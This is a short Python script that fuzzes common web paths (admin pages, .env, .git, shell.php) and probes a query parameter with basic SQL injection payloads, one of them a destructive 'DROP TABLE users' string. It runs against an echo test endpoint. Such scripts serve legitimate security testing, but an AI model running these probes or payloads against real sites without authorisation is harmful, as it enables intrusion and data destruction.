import requests
import time

WORDLIST = [
    "admin", "login", "backup", "config", "dashboard",
    "api", "upload", "shell.php", "wp-admin", ".env",
    ".git", "robots.txt", "test", "phpmyadmin"
]

SQLI_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "1; DROP TABLE users--",
    "' UNION SELECT NULL--",
]

def directory_fuzz(base_url):
    print(f"\nFuzzing: {base_url}\n")
    for path in WORDLIST:
        url = f"{base_url}/{path}"
        try:
            res = requests.get(url, timeout=5, allow_redirects=False)
            if res.status_code != 404:
                print(f"  [{res.status_code}] {url}")
            time.sleep(0.2)
        except requests.RequestException:
            pass

def sqli_probe(base_url):
    print(f"\nProbing for SQLi: {base_url}\n")
    error_signatures = ["sql", "syntax", "mysql", "ora-", "pg::"]
    for payload in SQLI_PAYLOADS:
        try:
            res = requests.get(base_url, params={"q": payload}, timeout=5)
            body = res.text.lower()
            if any(sig in body for sig in error_signatures):
                print(f"  [possible sqli] payload: {payload}")
            else:
                print(f"  [no error]      payload: {payload}")
            time.sleep(0.2)
        except requests.RequestException:
            pass

directory_fuzz("https://echo.free.beeceptor.com")
sqli_probe("https://echo.free.beeceptor.com")